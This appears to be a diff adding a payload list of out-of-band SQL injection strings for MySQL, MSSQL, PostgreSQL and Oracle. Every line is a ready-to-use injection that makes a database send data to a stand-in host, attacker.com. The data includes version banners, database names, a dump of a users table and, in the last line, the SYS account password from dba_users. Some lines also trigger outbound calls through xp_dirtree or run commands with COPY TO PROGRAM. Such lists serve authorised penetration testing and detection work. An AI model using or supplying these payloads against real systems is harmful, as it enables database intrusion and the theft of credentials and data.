@@ -1,0 +1,21 @@
+# MySQL OOB (Out-of-Band)
+' AND LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\a'))--
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a')))--
+SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt' FROM users--
+
+# MSSQL OOB
+'; EXEC master..xp_dirtree '\\attacker.com\share'--
+'; DECLARE @q VARCHAR(1024); SET @q='\\'+DB_NAME()+'.attacker.com\a'; EXEC master..xp_dirtree @q--
+'; EXEC master..xp_fileexist '\\attacker.com\share'--
+'; EXEC master..xp_subdirs '\\attacker.com\share'--
+
+# PostgreSQL OOB
+'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--
+'; CREATE EXTENSION dblink; SELECT dblink_connect('host=attacker.com')--
+
+# Oracle OOB
+' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1))=1--
+' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com')--
+' AND HTTPURITYPE('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)).GETCLOB()=1--
+' AND DBMS_LDAP.INIT((SELECT banner FROM v$version WHERE ROWNUM=1)||'.attacker.com',80)--
+' AND SYS.DBMS_LDAP.INIT((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com',80)--
